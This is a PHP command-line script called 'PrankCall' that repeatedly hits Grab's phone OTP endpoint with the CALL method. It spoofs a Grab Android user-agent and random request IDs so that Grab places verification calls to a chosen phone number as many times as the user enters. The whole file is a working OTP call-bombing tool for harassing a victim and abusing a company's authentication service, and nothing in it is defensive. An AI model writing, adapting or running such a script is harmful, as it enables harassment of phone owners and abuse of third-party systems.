<?php

class PrankCall
{
    /**
     * @var string $phone
     */
    private $phone;

    /**
     * PrankCall constructor.
     *
     * @throws Exception
     */
    public function __construct()
    {
        if (!extension_loaded('curl')) {
            throw new \Exception(
                'Seems curl extension not loaded. See https://www.php.net/manual/en/curl.installation.php'
            );
        }

        if (!ini_get("register_argc_argv")) {
            throw new \Exception(
                'Argv & argc variables disabled. See https://www.php.net/manual/en/reserved.variables.argv.php'
            );
        }
    }

    /**
     * @throws Exception
     */
    public function run()
    {
        $this->initArgs();
        echo "Phone: " . $this->phone . PHP_EOL;
        echo "Times?" . PHP_EOL;
        $times = (int)trim(fgets(STDIN));
        if (!$times) {
            echo "Exit... Times should be more then 0." . PHP_EOL;
        }

        $this->runMultiple($times);
    }

    /**
     * @param int $iterations
     */
    private function runMultiple(
        $iterations = 1
    ) {
        for ($i = 0; $i < $iterations; $i++) {
            try {
                $result = $this->makeCall();

                if (empty($result['challengeID'])) {
                    echo "[$i] Failed: " . json_encode($result) . PHP_EOL;
                } else {
                    echo "[$i] Success" . PHP_EOL;
                }
            } catch (\Exception $throwable) {
                echo "[$i] Critical: " . $throwable->getMessage(). PHP_EOL;
            }
            sleep(1);
        }
    }

    /**
     * @return mixed
     * @throws Exception
     */
    private function makeCall()
    {
        $androidVersion = "(Android " . mt_rand(5, 10) . "." . mt_rand(1, 5) . "." . mt_rand(
                1,
                6
            ) . "; Build " . mt_rand(10000, 99999) . ")";
        $post = "method=CALL&countryCode=id&phoneNumber=$this->phone&templateID=pax_android_production";
        $headers[] = "x-request-id: " . $this->v4();
        $headers[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
        $headers[] = "User-Agent: Grab/5.20.0 $androidVersion";
        $headers[] = "Content-Type: application/x-www-form-urlencoded";
        $headers[] = "Content-Length: " . strlen($post);
        $headers[] = "Host: api.grab.com";
        $headers[] = "Connection: close";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FAILONERROR, true);
        $x = curl_exec($ch);

        if ($x === false) {
            throw new \Exception('Curl error: ' . curl_error($ch));
        }

        curl_close($ch);
        return json_decode($x, true);
    }

    /**
     * @throws Exception
     */
    private function initArgs()
    {
        global $argv;
        $phone = isset($argv[1]) ? trim((string)$argv[1]) : null;
        if (is_null($phone) || strlen($phone) == 0) {
            throw new \InvalidArgumentException(
                'Phone missing. Please, write it as `call.php +1(650)253-0000`, without spaces'
            );
        }

        $phone = preg_replace('/\D+/', '', $phone);
        $this->phone = $this->fixNumber($phone);
    }

    private function fixNumber(
        $no
    ) {
        $cek = substr($no, 0, 2);
        if ($cek == "08") {
            $no = "62" . substr($no, 1);
        }
        return $no;
    }

    /**
     * @return string
     */
    private function v4()
    {
        return sprintf(
            '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',

            // 32 bits for "time_low"
            mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),

            // 16 bits for "time_mid"
            mt_rand(0, 0xffff),

            // 16 bits for "time_hi_and_version",
            // four most significant bits holds version number 4
            mt_rand(0, 0x0fff) | 0x4000,

            // 16 bits, 8 bits for "clk_seq_hi_res",
            // 8 bits for "clk_seq_low",
            // two most significant bits holds zero and one for variant DCE1.1
            mt_rand(0, 0x3fff) | 0x8000,

            // 48 bits for "node"
            mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0xffff)
        );
    }
}

$call = new PrankCall();
$call->run();
